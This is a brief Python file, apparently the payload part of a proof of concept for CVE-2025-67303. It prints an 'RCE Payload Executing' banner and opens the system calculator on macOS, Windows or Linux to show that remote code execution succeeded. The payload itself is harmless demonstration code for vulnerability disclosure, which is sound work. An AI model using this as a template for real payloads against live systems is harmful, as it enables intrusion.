import subprocess
import sys
print("=" * 60)
print("[CVE-2025-67303 PoC] RCE Payload Executing!")
if sys.platform == "darwin":
    subprocess.Popen(["open", "-a", "Calculator"])
    print("[RCE] macOS Calculator opened!")
elif sys.platform == "win32":
    subprocess.Popen(["calc.exe"])
else:
    subprocess.Popen(["gnome-calculator"])
print("=" * 60)
